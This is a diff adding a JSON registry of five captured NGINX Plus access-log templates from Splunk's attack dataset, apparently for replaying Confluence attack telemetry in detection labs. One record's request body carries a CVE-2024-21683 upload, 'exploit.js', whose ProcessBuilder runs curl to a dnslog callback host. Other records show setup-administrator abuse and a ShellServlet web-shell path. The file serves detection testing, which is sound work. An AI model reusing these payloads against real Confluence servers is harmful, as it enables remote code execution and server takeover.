@@ -1,0 +1,91 @@
+{
+ "schema_version": "1.0",
+ "registry_version": "universe-batch7-2026-10-30",
+ "purpose": "Authentic NGINX Plus key=value access records (splunk/attack_data), rendered natively with the record's own time_local re-stamped.",
+ "engine_module": "src/netspout_core/universe_batch7_engine.py",
+ "provenance": {
+  "corpus": "splunk/attack_data",
+  "pinned_commit": "4389fa7a4e74a7c083c0fbe448fa2c7c32378981",
+  "path": "datasets/attack_techniques/T1190/confluence/",
+  "declared_by": "Splunk Add-on for NGINX (Splunkbase 3258), pinned Splunkbase snapshot 2026-10-26",
+  "ta_parsing": "NOT verified: the add-on package is not installed in any lab"
+ },
+ "sources": [
+  {
+   "batch_source_id": "nginx:plus:access",
+   "vendor": "nginx_f5",
+   "product": "NGINX Plus access (key=value)",
+   "splunk_sourcetype": "nginx:plus:access",
+   "generator": "format_universe_batch7_log",
+   "event_families": [
+    "captured_1",
+    "captured_2",
+    "captured_3",
+    "captured_4",
+    "captured_5"
+   ],
+   "families": [
+    {
+     "id": "captured_1",
+     "template": "site=\"confluence.catjamfest.com\" server=\"confluence.catjamfest.com\" dest_port=\"80\" dest_ip=\"10.0.1.23\" src=\"54.69.114.23\" src_ip=\"54.69.114.23\" user=\"-\" time_local=\"$NGINX_TS$\" protocol=\"HTTP/1.1\" status=\"200\" bytes_out=\"5041\" bytes_in=\"5009\" http_referer=\"-\" http_user_agent=\"curl/7.88.1\" nginx_version=\"1.18.0\" http_x_forwarded_for=\"-\" http_x_header=\"-\" uri_query=\"-\" uri_path=\"/setup/finishsetup.action\" http_method=\"POST\" response_time=\"0.108\" cookie=\"-\" request_time=\"0.109\" category=\"text/html;charset=UTF-8\" https=\"\"",
+     "tokens": [
+      "$NGINX_TS$"
+     ],
+     "dataset": "nginx_plus_kv_confluence.log",
+     "dataset_sha256": "937955232a1de0c5f39419c28e5706c19006baa3a2c24255f1ed311e82492cbf",
+     "dataset_line": 1,
+     "captured_sha256": "6d2ca5ba6a5fe392ce55fe461d73c30268702579107546a33f96f3b0db21583a"
+    },
+    {
+     "id": "captured_2",
+     "template": "site=\"confluence.catjamfest.com\" server=\"confluence.catjamfest.com\" dest_port=\"80\" dest_ip=\"10.0.1.23\" src=\"54.69.114.23\" src_ip=\"54.69.114.23\" user=\"-\" time_local=\"$NGINX_TS$\" protocol=\"HTTP/1.1\" status=\"302\" bytes_out=\"710\" bytes_in=\"655\" http_referer=\"-\" http_user_agent=\"curl/7.88.1\" nginx_version=\"1.18.0\" http_x_forwarded_for=\"-\" http_x_header=\"-\" uri_query=\"-\" uri_path=\"/setup/setupadministrator.action\" http_method=\"POST\" response_time=\"0.120\" cookie=\"-\" request_time=\"0.122\" category=\"text/html;charset=UTF-8\" https=\"\"",
+     "tokens": [
+      "$NGINX_TS$"
+     ],
+     "dataset": "nginx_plus_kv_confluence.log",
+     "dataset_sha256": "937955232a1de0c5f39419c28e5706c19006baa3a2c24255f1ed311e82492cbf",
+     "dataset_line": 2,
+     "captured_sha256": "67ef3551045f5618c2321ab2799e7606142b8274a82aed85d4a44ef51dd157ec"
+    },
+    {
+     "id": "captured_3",
+     "template": "site=\"confluence.example.com\" server=\"confluence.examplesite.com\" dest_port=\"80\" dest_ip=\"1.1.1.8\" src=\"35.79.191.111\" src_ip=\"35.79.191.111\" user=\"-\" time_local=\"$NGINX_TS$\" protocol=\"HTTP/1.1\" status=\"200\" bytes_out=\"8312\" bytes_in=\"8279\" http_referer=\"-\" http_user_agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\" nginx_version=\"1.24.0\" http_x_forwarded_for=\"-\" http_x_header=\"-\" uri_query=\"os_destination=%2Fadmin%2Fplugins%2Fnewcode%2Faddlanguage.action&permissionViolation=true\" uri_path=\"/login.action\" http_method=\"GET\" response_time=\"0.041\" cookie=\"JSESSIONID=513BCF9B7FD499DBF5C973D0B83FA5D2\" request_time=\"0.041\" category=\"text/html;charset=UTF-8\" https=\"\" request_body=\"-\" ",
+     "tokens": [
+      "$NGINX_TS$"
+     ],
+     "dataset": "nginx_kv_confluence_CVE-2024-21683.log",
+     "dataset_sha256": "3af5ff7fc6e169237652580760af15a3189535d438613011917c60058693ef61",
+     "dataset_line": 1,
+     "captured_sha256": "cb401a3fc38887099e3a1b3a3ffc383affdc036562741e236c36fd085e0d0bab"
+    },
+    {
+     "id": "captured_4",
+     "template": "site=\"confluence.example.com\" server=\"confluence.examplesite.com\" dest_port=\"80\" dest_ip=\"1.1.1.8\" src=\"35.79.191.111\" src_ip=\"35.79.191.111\" user=\"-\" time_local=\"$NGINX_TS$\" protocol=\"HTTP/1.1\" status=\"302\" bytes_out=\"384\" bytes_in=\"334\" http_referer=\"-\" http_user_agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\" nginx_version=\"1.24.0\" http_x_forwarded_for=\"-\" http_x_header=\"-\" uri_query=\"-\" uri_path=\"/admin/plugins/newcode/addlanguage.action\" http_method=\"POST\" response_time=\"0.010\" cookie=\"JSESSIONID=513BCF9B7FD499DBF5C973D0B83FA5D2\" request_time=\"0.107\" category=\"text/html;charset=UTF-8\" https=\"\" request_body=\"--34e4662f537eba24f137c989043c8131\\x0D\\x0AContent-Disposition: form-data; name=\\x22atl_token\\x22\\x0D\\x0A\\x0D\\x0A333bce53aeb50d28ff387be3eaa4543ac86fd2e8\\x0D\\x0A--34e4662f537eba24f137c989043c8131\\x0D\\x0AContent-Disposition: form-data; name=\\x22newLanguageName\\x22\\x0D\\x0A\\x0D\\x0Atest\\x0D\\x0A--34e4662f537eba24f137c989043c8131\\x0D\\x0AContent-Disposition: form-data; name=\\x22languageFile\\x22; filename=\\x22exploit.js\\x22\\x0D\\x0AContent-Type: text/javascript\\x0D\\x0A\\x0D\\x0Anew java.lang.ProcessBuilder[\\x22(java.lang.String[])\\x22]([\\x22curl\\x22, \\x22confluence.examplesite.com.vc1uycv5.dnslog.pw\\x22]).start()\\x0D\\x0A--34e4662f537eba24f137c989043c8131--\\x0D\\x0A\" ",
+     "tokens": [
+      "$NGINX_TS$"
+     ],
+     "dataset": "nginx_kv_confluence_CVE-2024-21683.log",
+     "dataset_sha256": "3af5ff7fc6e169237652580760af15a3189535d438613011917c60058693ef61",
+     "dataset_line": 2,
+     "captured_sha256": "5e1ba3815225944207b4d9f3568e854099cf793f0b65ffc68e4176c75b55c84a"
+    },
+    {
+     "id": "captured_5",
+     "template": "site=\"confluence_test.test.com\" server=\"confluence_test.test.com\" dest_port=\"80\" dest_ip=\"172.31.31.178\" src=\"101.91.136.142\" src_ip=\"101.91.136.142\" user=\"-\" time_local=\"$NGINX_TS$\" protocol=\"HTTP/1.1\" status=\"200\" bytes_out=\"734\" bytes_in=\"0\" http_referer=\"-\" http_user_agent=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" nginx_version=\"1.18.0\" http_x_forwarded_for=\"-\" http_x_header=\"-\" uri_query=\"-\" uri_path=\"/plugins/servlet/com.jsos.shell/ShellServlet\" http_method=\"GET\" response_time=\"0.000\" cookie=\"\" request_time=\"0.001\" category=\"text/html\" https=\"\" request_body=\"-\" ",
+     "tokens": [
+      "$NGINX_TS$"
+     ],
+     "dataset": "nginx_shellservlet.log",
+     "dataset_sha256": "882dfb334bc8c0ec226d0c60938beae8c2b67390c3dd107ec74cae52c2eccd78",
+     "dataset_line": 1,
+     "captured_sha256": "882dfb334bc8c0ec226d0c60938beae8c2b67390c3dd107ec74cae52c2eccd78"
+    }
+   ]
+  }
+ ],
+ "counts_summary": {
+  "new_native_sourcetypes": 1,
+  "families": 5,
+  "scenario_packs": 0
+ }
+}
